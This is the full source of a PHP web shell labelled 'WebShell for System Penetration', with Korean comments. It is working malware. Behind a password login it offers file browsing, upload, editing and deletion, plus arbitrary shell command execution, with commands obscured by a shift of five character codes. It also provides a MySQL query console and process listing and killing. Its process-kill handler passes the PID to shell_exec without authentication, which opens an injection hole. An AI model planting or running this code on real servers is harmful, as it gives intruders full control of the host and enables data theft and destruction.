<?php
    session_start();
    header("Content-Type: text/html; charset=UTF-8");

    $hash_id = "e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9"; // 해쉬 아이디
    $hash_pw = "051375546db9782e3debc25e0241edf1d5e5e2ec0f183dd8634ca5b2c8968bb8"; // 저장된 해시된 비밀번호

    $mode = isset($_REQUEST['mode']) ? $_REQUEST['mode'] : '';
    $page = basename($_SERVER['PHP_SELF']);
    $path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '';
    $filename = isset($_GET['filename']) ? $_GET['filename'] : '';
    $dbhost = isset($_POST['dbhost']) ? $_POST['dbhost'] : '';
    $dbid = isset($_POST['dbid']) ? $_POST['dbid'] : '';
    $dbpw = isset($_POST['dbpw']) ? $_POST['dbpw'] : '';
    $dbname = isset($_POST['dbname']) ? $_POST['dbname'] : '';
    $query = isset($_POST['query']) ? $_POST['query'] : '';
    $currentFileName = basename(__FILE__);
    $identity;
    if(isset($_POST['pid'])) {
        $pid = $_POST['pid']; // PID 값을 변수에 할당
        $output = shell_exec("taskkill /F /PID $pid");
        if ($output === null) {
            echo "프로세스를 종료하는 데 문제가 발생했습니다.";
        }
    }
    if(!isset($_SESSION["webshell"])) {
        if(isset($_POST['loginid']) && isset($_POST['loginpw'])){
            $input_id = $_POST['loginid'];
            $input_pw = $_POST['loginpw'];
            if (hash('sha256', $input_id) === $hash_id && hash('sha256', $input_pw) === $hash_pw ){
                $_SESSION["webshell"] = "success";
                header("Location: " . $_SERVER['PHP_SELF']);
                exit();
            }else {
                $identity = false;
            }
        }
    }

    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {   // 운영체제 탐지
        $system_os = 'windows';
    } else if(strtoupper(substr(PHP_OS, 0, 3)) === 'Lin') {
        $system_os = 'linux';
    }

    if($mode == 'fileCreate'){ // mode 파라미터가 fileCreate일 경우 파일 생성을 위한 조건문
        if($filename == ''){
            echo "<script>alert('빈 값이 존재합니다.');history.back(-1);</script>";
            exit;
        }else if(file_exists($path.$filename)){
            echo "<script>alert('이미 존재하는 파일입니다.');history.back(-1)</script>";
            exit;
        }
        $fp = fopen($path.$filename, "w");  // fopen을 사용해서 fp 변수를 통해 파일 작성
        fclose($fp);
        echo "<script>location.href='{$page}?mode=browser&path={$path}'</script>";
        exit;
    }else if($mode == 'dirCreate'){ //mode 파라미터가 dirCreate일 경우 디렉토리 생성을 위한 조건문
        if($filename == ''){
            echo "<script>alert('빈 값이 존재합니다.');history.back(-1);</script>";
            exit;
        }
        $dirPath = $path.$filename;
        if(is_dir($dirPath)){
            echo "<script>alert('이미 존재하는 디렉토리입니다.');history.back(-1)</script>";
            exit;
        }
        mkdir($dirPath);    // mkdir을 사용하여 디렉토리 생성
        echo "<script>location.href='{$page}?mode=browser&path={$path}'</script>";
        exit;
    }else if($mode == 'fileModify' && !empty($_POST['fileContents'])){  // mode 값이 fileModify일 경우에는 파일 수정
        $filePath = $path.$filename;
        if(!file_exists($filePath)){
            echo "<script>alert('존재하지 않는 파일입니다.');history.back(-1)</script>";    // file_exists 함수를 사용하여 존재하는 파일인지 검증
            exit;   // 만약 존재하지 않는다면 exit
        }
        $fileContents = $_POST['fileContents']; // 존재한다면 파일의 수정 내용을 불러오기 위해 POST 요청으로 받은 fileContents 변수를 관리
        $fp = fopen($filePath, "w");
        fputs($fp, $fileContents, strlen($fileContents));   // 전달받은 파라미터의 문자열 길이만큼 삽입
        fclose($fp);
        echo "<script>location.href='{$page}?mode=browser&path={$path}'</script>";  // 수정 후 다시 글 목록 페이지로 리턴
    }else if($mode == 'fileDelete'){    // mode 값이 fileDelete 일 경우 파일 삭제를 진행
        if($filename == ''){
            echo "<script>alert('빈 값이 존재합니다.');history.back(-1);</script>"; // 삼항 연산자를 통해 filename이 빈값이라면 리턴
            exit;
        }
        $filePath = $path.$filename;
        if(!file_exists($filePath)){
            echo "<script>alert('존재하지 않는 파일입니다.');history.back(-1)</script>";    // file_exists를 통해 파일 존재여부 검증
            exit;
        }else if(!unlink($filePath)){
            echo "<script>alert('파일 삭제에 실패했습니다.');history.back(-1)</script>";    // 상세 불명의 이유로 실패하면 리턴
            exit;
        }
        echo "<script>location.href='{$page}?mode=browser&path={$path}'</script>";
    }else if($mode == 'dirDelete'){ // mode 값이dirDelete일 경우 디렉토리 삭제로직 구현
        if($filename == ''){
            echo "<script>alert('빈 값이 존재합니다.');history.back(-1);</script>"; // 삼항 연산자를 통해 filename이 빈값이라면 리턴
            exit;
        }
        $filePath = $path.$filename;
        if(!is_dir($filePath)){
            echo "<script>alert('존재하지 않는 디렉토리입니다.');history.back(-1)</script>";    // is_dir 함수를 통해 디렉토리 존재여부 검증
            exit;
        }else if(!rmdir($dirPath)){
            echo "<script>alert('디렉토리 삭제에 실패했습니다.');history.back(-1)</script>";    // 상세 불명의 이유로 실패하면 리턴
            exit;
        }
        echo "<script>location.href='{$page}?mode=browser&path={$path}'</script>";
    }else if($mode == 'fileDownload'){ // mode 값이 fileDownload일 경우 파일 다운로드를 위한 로직 구현
        if($filename == ''){
            echo "<script>alert('빈 값이 존재합니다.');history.back(-1);</script>"; // 삼항 연산자를 통해 filename이 빈값이라면 리턴
            exit;
        }
        $filePath = $path.$filename;
        if(!file_exists($filePath)){
            echo "<script>alert('존재하지 않는 파일입니다.');history.back(-1)</script>";    // file_exists를 통해 파일 존재여부 검증
            exit;
        }
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"{$filename}\"");
        header("Content-Transfer-Encoding: binary");

        readfile($filePath);   // readfile 함수를 통해서 파일 다운로드
        exit;   // exit를 하지 않으면 하위 html 코드까지 모두 다운로드 하기 때문에 반드시 exit 사용해야함
    }else if($mode == 'upload' && !empty($_FILES['file']['tmp_name'])){ //mode 값이 upload일 경우 파일 업로드 로직 실행
        $filePath = $path.$_FILES['file']['name'];
        if(!move_uploaded_file($_FILES['file']['tmp_name'], $filePath)){
            echo "<script>alert('파일 업로드에 실패했습니다.');history.back(-1)</script>";    // 상세 불명의 이유로 실패하면 리턴
            exit;
        }
        echo "<script>location.href='{$page}?mode=browser&path={$path}'</script>";
    }

    if(empty($path)){   // 만약 path 값이 공백이라면 현재 파일명을 경로로 지정
        $tempFileName = basename(__FILE__);
        $tempPath = realpath(__FILE__);
        $path = str_replace($tempFileName, "", $tempPath);
        $path = str_replace("\\", "/", $path);

    }else{  // path값이 공백이 아니라면 해당 path 변수의 전체 경로를 경로로 지정
        $path = realpath($path)."/";
             $path = str_replace("\\", "/", $path);
    }


    function getDirList($getPath){  // 디렉토리와 파일을 각각 구분하여 출력하기 위해 배열로 관리
        $listArr = array();
        $handler = opendir($getPath);
        if ($handler !== false) {
            while (($file = readdir($handler)) !== false) {
                if ($file != "." && is_dir($getPath . $file)) {
                    $listArr[] = $file;
                }
            }
            closedir($handler);
        }
        return $listArr;
    }

    function getFileList($getPath){ // 디렉토리와 파일을 각각 구분하여 출력하기 위해 배열로 관리
        $listArr = array();
        $handler = opendir($getPath);
        while($file = readdir($handler)){
            if(is_dir($getPath.$file) != "1"){
                $listArr[] = $file;
            }
        }
        closedir($handler);
        return $listArr;
    }
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* 흔들림 애니메이션 효과 */
        @keyframes shake {
            0% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-10px); }
            80% { transform: translateX(10px); }
            100% { transform: translateX(0); }
        }
        .shake-animation {
            animation: shake 0.4s ease-in-out;
            position: relative;
        }
    </style>
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
    <!-- Optional theme -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap-theme.min.css" integrity="sha384-6pzBo3FDv/PJ8r2KRkGHifhEocL+1X2rVCTTkUfGk7/0pbek5mMa1upzvWbrUbOZ" crossorigin="anonymous">
    <!-- Latest compiled and minified JavaScript -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
    <title>WebShell</title>
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2"></div>
            <div class="col-md-8"><h3 style="font-family: 'CastroScript', cursive;">WebShell for System Penetration</h3> 
                <hr>
                <?php
                    if(!isset($_SESSION['webshell'])){?>
                    <div style="width:50%; margin:auto; text-align:center">
                        <form action="<?=$currentFileName?>" method="POST" >
                            <input type="text" id="uid" class="form-control" placeholder="ID" required autofocus name="loginid" autocomplete="off"><BR>
                            <input type="password" id="upw" class="form-control" placeholder="Password" required name="loginpw" autocomplete="off"><br>
                            <div style="color: red; text-align: center; margin-bottom: 20px; display:none" id="wrong_pw">Wrong password !</div>
                            <button id="btn_login" class="btn btn-outline-success" type="submit" style="width:30%">Login</button>
                        </form>
                    </div>
                    <script>
                        var identity = <?= json_encode($identity) ?>;
                        if (identity === false) {
                            var wrong = document.getElementById("wrong_pw");
                            wrong.style.display = "block"; 
                            wrong.classList.add('shake-animation');
                        }
                    </script>
                <?php }else{
                ?>
                <!-- 네비게이션 창 -->
                <ul class="nav nav-tabs" id="tab-btn">
                    <li role="presentation" <?php if(empty($mode) || $mode == "browser") echo "class=\"active\""; ?>><a href="<?=$page?>?mode=browser">File Browser</a></li>
                    <li role="presentation" <?php if($mode == "upload") echo "class=\"active\""; ?>><a href="<?=$page?>?mode=upload&path=<?=$path?>">File Upload</a></li>
                    <li role="presentation" <?php if($mode == "command") echo "class=\"active\""; ?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
                    <li role="presentation" <?php if($mode == "db") echo "class=\"active\""; ?>><a href="<?=$page?>?mode=db">DB Connector</a></li>
                    <li role="presentation" <?php if($mode == "process") echo "class=\"active\""; ?>><a href="<?=$page?>?mode=process">Process List</a></li>
                </ul>
                <br>
            <?php
                // File Browser 버튼이 활성화 된 상태일때만 전체 경로 출력 및 입력 폼 출력
                if(empty($mode) || $mode=="browser"){ ?>
                <form action="<?=$page?>?mode=browser" method="GET">
                    <div class="input-group">
                        <span class="input-group-addon">Current Path</span>
                        <input name="path" type="text" class="form-control" placeholder="Path Input" autocomplete="off" value="<?=$path?>">
                        <span class="input-group-btn">
                            <button class="btn btn-default" type="submit">Move</button>
                        </span>
                    </div>
                </form>
                <br>
                <div class="table-responsive">
                    <!-- 테이블 생성 -->
                    <table class="table table-bordered table-hover" style="table-layout: fixed; word-break: break-all;">
                        <thead>
                            <tr class="active">
                                <th style="width:45%" class="text-center">Name</th>
                                <th style="width:15%" class="text-center">Type</th>
                                <th style="width:20%" class="text-center">Date</th>
                                <th style="width:20%" class="text-center">Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            <!-- 반복문을 통해서 존재하는 디렉토리를 모두 출력 -->
                            <?php
                                $dirList = getDirList($path);
                                for($i=0; $i<count($dirList); $i++){
                                    if($dirList[$i] != ". ||"){
                                        $dirDate = date("Y-m-d", filemtime($path.$dirList[$i]));
                            ?>
                            <tr>
                                <td style="vertical-align: middle;" class="text-primary"><b><span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span> &nbsp;&nbsp;<a href="<?=$page?>?mode=browser&path=<?=$path?><?=$dirList[$i]?>"><?=$dirList[$i]?></a><b></td>
                                <td style="vertical-align: middle;" class="text-center"><code style="background-color: whitesmoke;">Directory</code></td>
                                <td style="vertical-align: middle;" class="text-center"><?=$dirDate?></td>
                                <td style="vertical-align: middle;" class="text-center">
                                    <div class="btn-group btn-group-sm">
                                        <button onclick="dirDelete('<?=$dirList[$i]?>')" class="btn btn-default" title="File Delete" type="button"><span class="glyphicon glyphicon-trash" aria-hidden="true"></span></button>
                                    </div>
                                </td>
                            </tr>
                            <?php } } ?>
                            <!-- 반복문을 통해서 존재하는 파일들을 모두 출력 -->
                            <?php
                               $fileList = getFileList($path);
                               for ($i = 0; $i < count($fileList); $i++) {
                                   $filePath = $path . $fileList[$i];
                                   if (file_exists($filePath)) {
                                       $fileDate = date("Y-m-d", filemtime($filePath));
                            ?>
                            <tr>
                                <td style="vertical-align: middle;"><span class="glyphicon glyphicon-file" aria-hidden="true"></span> &nbsp;<?=$fileList[$i]?></td>
                                <td style="vertical-align: middle;" class="text-center"><code style="color: green; background-color:whitesmoke">File</code></td>
                                <td style="vertical-align: middle;" class="text-center"><?=$fileDate?></td>
                                <td style="vertical-align: middle;" class="text-center">
                                    <div class="btn-group btn-group-sm">
                                        <button onclick="fileDownload('<?=$fileList[$i]?>')" class="btn btn-default" title="File Download" type="button"><span class="glyphicon glyphicon-save" aria-hidden="true"></span></button>
                                        <button onclick="fileModify('<?=$fileList[$i]?>')" class="btn btn-default" title="File Modify" type="button"><span class="glyphicon glyphicon-wrench" aria-hidden="true"></span></button>
                                        <button onclick="fileDelete('<?=$fileList[$i]?>')" class="btn btn-default" title="File Delete" type="button"><span class="glyphicon glyphicon-trash" aria-hidden="true"></span></button>
                                    </div>
                                </td>
                            </tr>
                            <?php }} ?>
                        </tbody>
                    </table>
                </div>
                <hr>
                <!-- 파일 생성&디렉토리 생성을 위한 폼 -->
                <form action="" name="frm">
                    <div class="input-group">
                        <span class="input-group-addon">Current Path</span>
                        <input name="createFileName" type="text" class="form-control" placeholder="File/Directory Name Inputt" autocomplete="off">
                        <span class="input-group-btn">
                            <button class="btn btn-default" type="button" onclick="fileCreate()">File Create</button>
                            <button class="btn btn-default" type="button" onclick="dirCreate()">Directory Create</button>
                        </span>
                    </div>
                </form>
            <?php } else if($mode == 'fileModify'){ ?>
            <?php
                $filePath = $path.$filename;
                if(empty($filename)){
                    echo "<script>alert('값이 입력되지 않았습니다.');history.back(-1);</script>";
                    exit;
                }else if(!file_exists($filePath)){
                    echo "<script>alert('존재하지 않는 파일입니다.');history.back(-1);</script>";
                    exit;
                }
                $fp = fopen($filePath, "r");
                if(filesize($filePath) == 0){
                    $filesize = 1;
                }else{
                    $filesize = filesize($filePath);
                }
                $fileContents = htmlentities(fread($fp, $filesize));
                fclose($fp);
            ?>
                <form action="<?=$page?>?mode=fileModify&path=<?=$path?>&filename=<?=$filename?>" method="POST">
                    <div class="input-group">
                        <input type="text" class="form-control" autocomplete="off" value="<?=$path.$filename?>">
                        <span class="input-group-btn">
                            <button class="btn btn-default" type="submit">Modify</button>
                        </span>
                    </div>
                <hr>
                    <textarea class="form-control" rows="20" name="fileContents"><?=$fileContents?></textarea>
                </form>
                <br>
                <p class="text-center"><button class="btn btn-default" type="button" onclick="history.back(-1)">Back</button></p>
            <?php }else if($mode == 'upload'){ ?>
                <form action="<?=$page?>?mode=upload&path=<?=$path?>&filename=<?=$filename?>" enctype="multipart/form-data" method="POST">
                    <div class="input-group">
                        <span class="input-group-addon">Upload Path</span>
                        <input name="path" type="text" class="form-control" placeholder="Path Input" autocomplete="off" value="<?=$path?>">
                    </div>
                    <hr>
                    <div class="form-group">
                        <label for="exampleInputFile">File input</label>
                        <input type="file" id="exampleInputFile" name="file">
                        <p class="text-center"><button class="btn btn-default" type="submit">File Upload</button></p>
                    </div>
                </form>
            <?php }else if($mode == 'command'){?>
                <form action="<?=$page?>?mode=command" method="POST" name="commandForm">
                    <div class="input-group">
                        <span class="input-group-addon">Command</span>
                        <input name="command" type="text" class="form-control" placeholder="Command Input" autocomplete="off">
                        <span class="input-group-btn"><button onclick="cmdRequest()" class="btn btn-default" type="submit">Execution</button></span>
                    </div>
                    <hr>
                </form>
            <?php
                if(!empty($_POST['command'])){
                    $cmd = $_POST['command'];
                    $cmd = explode(",", $cmd);
                    $decode_cmd = "";
                    for($i=0; $i<count($cmd); $i++){
                        $ascii = intval($cmd[$i]) -5;
                        $decode_cmd.=chr($ascii);
                    }
                    $result = shell_exec($decode_cmd);
                    $result = str_replace("\n", "<br>", $result);
                    $result = iconv("CP949", "UTF-8", $result);
            ?>
                <div style="background-color: whitesmoke; width:100%; height:500px; overflow:auto; margin:auto; padding:20px; padding-left:50px">
                    <?= $result?>
                </div>
            <?php
                }else {?>
                <div style="background-color: whitesmoke; width:100%; height:500px; overflow:auto; margin:auto; padding:20px; padding-left:50px">
                </div>
            <?php } ?>
            <?php }else if($mode == 'db') {
                    if(empty($dbhost) || empty($dbid) || empty($dbpw) || empty($dbname)){
                ?>
                <form action="<?=$page?>?mode=db" method="POST" name="commandForm">
                    <div class="input-group">
                        <span class="input-group-addon">Host</span>
                        <input name="dbhost" type="text" class="form-control" placeholder="Host Input" autocomplete="off">
                        <span class="input-group-addon">Id</span>
                        <input name="dbid" type="text" class="form-control" placeholder="Id Input" autocomplete="off">
                        <span class="input-group-addon">Password</span>
                        <input name="dbpw" type="text" class="form-control" placeholder="Pw Input" autocomplete="off">
                        <span class="input-group-addon">Database</span>
                        <input name="dbname" type="text" class="form-control" placeholder="DB Input" autocomplete="off">
                    </div>
                    <hr>
                    <p class="text-center"><button class="btn btn-default" type="submit">Connection</button></p>
                </form>
                <?php }else{
                            $dbConn = new mysqli($dbhost, $dbid, $dbpw, $dbname);
                            if($dbConn->connect_errno){
                                echo "<script>alert('DB 접속에 실패했습니다.');history.back(-1);</script>";
                                exit;
                            }?>
                        <form action="<?=$page?>?mode=db" method="POST" name="commandForm">
                            <div class="input-group">
                                <span class="input-group-addon">SQL</span>
                                <input name="query" type="text" class="form-control" placeholder="Query Input" autocomplete="off" value="<?=isset($query) ? $query : ''?>">
                            </div>
                            <hr>
                            <p class="text-center"><button class="btn btn-default" type="submit">Execution</button></p>
                            <input type="hidden" name="dbhost" value="<?=$dbhost?>">
                            <input type="hidden" name="dbid" value="<?=$dbid?>">
                            <input type="hidden" name="dbpw" value="<?=$dbpw?>">
                            <input type="hidden" name="dbname" value="<?=$dbname?>">
                        </form>
                <?php   if(!empty($query)){
                            $result = $dbConn->query($query);
                            $num = $result->num_rows; ?>
                        <table class="table table-bordered table-hover">
                <?php   for($i=0; $i<$num; $i++){
                            $row = $result->fetch_assoc();
                            if($i==0){
                                $ratio = 100/count($row); ?>
                            <thead>
                                <tr class="active">
                <?php   foreach($row as $key => $value){ ?>              
                            <th style="width:<?=$ratio?>%" class="text-center"><?=$key?></th>
                <?php } ?>
                                </tr>
                            </thead>
                            <tbody>
                <?php } echo "<tr>";
                        foreach($row as $key => $value){?>
                            <td style="vertical-align: middle;" class="text-center"><?=$value?></td>
                <?php }
                    echo "</tr>"; } ?>
                            </tbody>
                        </table>
               <?php }}}else if($mode == 'process'){ ?>
                <table class="table table-bordered table-hover">
                    <thead>
                <tr class="active">
                    <th style="width:40%" class="text-center">
                        <div style="margin-left: 35px;">Image Name</div>
                    </th>
                    <th style="width:10%" class="text-center">PID</th>
                    <th style="width:15%" class="text-center">Session Name</th>
                    <th style="width:5%" class="text-center">Memory</th>
                    <th style="width:5%" class="text-center">Kill</th>
                </tr>
                </thead>
                <?php
                    if ($system_os == 'windows') {
                        $process = shell_exec('tasklist');
                        $process = str_replace("\n", "<br>", $process);
                        $process = mb_convert_encoding($process, 'UTF-8', 'CP949');
                        $process_list = explode("<br>", $process);
                        echo "<tr>";
                        for ($i = 4; $i < count($process_list); $i++){
                            echo "<tr>";
                            $process_items = preg_split('/\s+/', $process_list[$i]);
                            if (isset($process_items[1])) {
                                if (is_numeric($process_items[1])) {
                                    for ($j = 0; $j < count($process_items); $j++){
                                        if ($j != 3 && $j != 5){
                                            echo "<td style=\"padding-left: 20px;\">{$process_items[$j]}</td>";
                                        }} ?>
                                        <td class="text-center">
                                            <button type="button" class="btn btn-outline-danger" onclick="process_kill(<?=$process_items[1]?>)">
                                                <span class="glyphicon glyphicon-scissors" aria-hidden="true"></span>
                                            </button>
                                        </td>
                                    <?php
                                }else if(is_numeric($process_items[2])){
                                    for ($j = 0; $j < count($process_items); $j++){
                                        if ($j != 4 && $j != 6){
                                            if($j == 0){
                                                $process_name = $process_items[0].' '.$process_items[1];
                                                echo "<td style=\"padding-left: 20px;\">{$process_name}</td>";
                                                $j += 1;
                                            }else{
                                            echo "<td style=\"padding-left: 20px;\">{$process_items[$j]}</td>";
                                            }
                                        } }?>
                                        <td class="text-center">
                                            <button type="button" class="btn btn-outline-danger" onclick="process_kill(<?=$process_items[2]?>)">
                                                <span class="glyphicon glyphicon-scissors" aria-hidden="true"></span>
                                            </button>
                                        </td>
                                <?php    
                                }else if(is_numeric($process_items[3])){
                                    for ($j = 0; $j < count($process_items); $j++){
                                        if ($j != 5 && $j != 7){
                                            if($j == 0){
                                                $process_name = $process_items[0].' '.$process_items[1].' '.$process_items[2];
                                                echo "<td style=\" padding-left: 20px;\">{$process_name}</td>";
                                                $j += 2;
                                            }else{
                                            echo "<td style=\"padding-left: 20px;\">{$process_items[$j]}</td>";
                                            }
                                        }} ?>
                                        <td class="text-center">
                                            <button type="button" class="btn btn-outline-danger" onclick="process_kill(<?=$process_items[3]?>)">
                                                <span class="glyphicon glyphicon-scissors" aria-hidden="true"></span>
                                            </button>
                                        </td>
                                    <?php echo "</tr>";
                                }
                                
                            }
                        }
                    } 
               }} ?>
               </table>
                <hr>
                <p class="text-muted text-center">Copyright ⓒ 2024 Yeon Woo.</p>
            </div>
            <div class="col-md-2"></div>
        </div>
    </div>
    <script>
        // 파일 생성 버튼을 클릭했을 때
        function fileCreate(){
            var filename = frm.createFileName.value;
            if(!filename){
                alert('값이 입력되지 않았습니다.');
                return
            }
            location.href = "<?=$page?>?mode=fileCreate&path=<?=$path?>&filename=" + filename;
        }
        // 디렉토리 생성 버튼을 클릭했을 때때
        function dirCreate(){
            var filename = frm.createFileName.value;
            if(!filename){
                alert('값이 입력되지 않았습니다.');
                return
            }
            location.href = "<?=$page?>?mode=dirCreate&path=<?=$path?>&filename=" + filename;
        }
        // 파일 수정 버튼을 클릭했을 때
        function fileModify(filename){
            location.href = "<?=$page?>?mode=fileModify&path=<?=$path?>&filename=" + filename;
        }
        function dirDelete(filename){
            if(confirm(filename + " 디렉토리를 삭제하시겠습니까?") == true){
                location.href = "<?=$page?>?mode=dirDelete&path=<?=$path?>&filename=" + filename;
            }
        }
        function fileDelete(filename){
            if(confirm(filename + " 파일을 삭제하시겠습니까?") == true){
                location.href = "<?=$page?>?mode=fileDelete&path=<?=$path?>&filename=" + filename;
            }
        }
        function fileDownload(filename){
            location.href = "<?=$page?>?mode=fileDownload&path=<?=$path?>&filename=" + filename;
        }
        // 아스키코드로 인코딩하는 함수
        function cmdRequest() {
            const commandForm = document.commandForm;
            const cmd = commandForm.command.value;
            const encoding_cmd = [];
            
            // 아스키코드를 5씩 추가해서 인코딩
            for (let i = 0; i < cmd.length; i++) {
                encoding_cmd.push(cmd.charCodeAt(i) + 5);
            }
            commandForm.command.value = encoding_cmd.join(','); // 인코딩된 값을 문자열로 변환하여 설정
        }

        function process_kill(pid) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "<?=$currentFileName?>", true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {
                        alert('Successfully terminated the process.');
                        window.location.reload();
                    } else {
                        alert('There is an issue terminating the process.');
                    }
                }
            };
            xhr.send("pid=" + pid);
        }
    </script>
</body>
</html>